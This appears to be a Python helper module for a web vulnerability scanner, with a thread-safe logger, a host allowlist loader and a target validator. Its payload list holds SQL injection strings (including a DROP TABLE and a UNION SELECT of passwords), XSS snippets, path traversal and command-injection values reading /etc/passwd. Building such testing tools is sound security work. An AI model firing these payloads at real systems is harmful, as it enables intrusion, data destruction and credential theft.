import threading
from urllib.parse import urlparse

log_lock = threading.Lock()

COMMON_PAYLOADS = [
    "' OR '1'='1 --",
    "1; DROP TABLE users --",
    "' UNION SELECT null, username, password FROM users --",
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "../../../../etc/passwd",
    "; cat /etc/passwd",
    "| whoami",
    "$(id)",
    "`whoami`",
]

def thread_safe_log(filename: str, text: str) -> None:
    """Write a line to a log file using a shared lock."""
    with log_lock:
        with open(filename, "a", encoding="utf-8") as fh:
            fh.write(text + "\n")

def load_allowlist(path: str | None) -> set[str] | None:
    """Load allowed hosts from a newline-delimited file."""
    if not path:
        return None
    try:
        with open(path, encoding="utf-8") as fh:
            hosts = {line.strip() for line in fh if line.strip() and not line.strip().startswith("#")}
    except OSError as exc:
        raise ValueError(f"Unable to read allowlist file: {path}") from exc
    return hosts or None

def validate_target(url: str, allowlist: set[str] | None = None) -> str:
    """Validate target URL and optional allowlist, returning the hostname."""
    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        raise ValueError(f"Invalid target URL: {url}")
    if allowlist is not None and host not in allowlist:
        raise ValueError(f"Target host '{host}' is not in the allowlist.")
    return host
